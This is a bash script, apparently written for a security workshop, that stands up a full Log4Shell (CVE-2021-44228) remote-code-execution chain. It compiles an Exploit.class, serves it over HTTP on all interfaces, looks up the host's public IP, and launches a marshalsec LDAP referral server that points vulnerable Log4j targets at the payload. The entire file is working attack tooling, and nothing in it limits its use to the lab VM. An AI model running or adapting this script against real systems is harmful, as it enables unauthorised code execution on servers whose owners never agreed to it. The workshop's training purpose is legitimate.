#!/usr/bin/env bash
# Full Log4Shell RCE for the workshop (CVE-2021-44228).
#
#   ./tools/setup-marshalsec.sh
#   ./tools/run-log4shell-ldap.sh --codebase-host YOUR_PUBLIC_IP
#
# Starts HTTP (Exploit.class) + marshalsec LDAPRefServer. Trigger from /security.
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
JAR="${DIR}/marshalsec-0.0.3-SNAPSHOT-all.jar"
EXPLOIT_DIR="${DIR}/exploit"
LDAP_PORT="1389"
HTTP_PORT="8000"
CODEBASE_HOST=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --codebase-host) CODEBASE_HOST="$2"; shift 2 ;;
    --ldap-port) LDAP_PORT="$2"; shift 2 ;;
    --http-port) HTTP_PORT="$2"; shift 2 ;;
    -h|--help)
      echo "Usage: $0 --codebase-host PUBLIC_IP [--ldap-port 1389] [--http-port 8000]"
      exit 0
      ;;
    *) echo "Unknown arg: $1" >&2; exit 1 ;;
  esac
done

if [[ -z "$CODEBASE_HOST" ]]; then
  CODEBASE_HOST="$(curl -fsSL https://checkip.amazonaws.com 2>/dev/null | tr -d '[:space:]' || true)"
fi
if [[ -z "$CODEBASE_HOST" ]]; then
  echo "Set --codebase-host to an IP the TraditionalJay VM can reach." >&2
  exit 1
fi

if [[ ! -f "$JAR" ]]; then
  echo "marshalsec jar missing — run: $DIR/setup-marshalsec.sh" >&2
  exit 1
fi

echo "==> Compiling Exploit.class"
javac -d "$EXPLOIT_DIR" "$EXPLOIT_DIR/Exploit.java"

HTTP_PID=""
cleanup() {
  [[ -n "$HTTP_PID" ]] && kill "$HTTP_PID" 2>/dev/null || true
}
trap cleanup EXIT

echo "==> HTTP codebase on ${CODEBASE_HOST}:${HTTP_PORT}"
(cd "$EXPLOIT_DIR" && python3 -m http.server "$HTTP_PORT" --bind 0.0.0.0) &
HTTP_PID=$!
sleep 1

CODEBASE="http://${CODEBASE_HOST}:${HTTP_PORT}/#Exploit"
echo "[*] Log4Shell LDAP on 0.0.0.0:${LDAP_PORT} → ${CODEBASE}"
echo "[*] Waiting for JNDI callbacks from TraditionalJay…"
exec java -cp "$JAR" marshalsec.jndi.LDAPRefServer "$CODEBASE" "$LDAP_PORT"
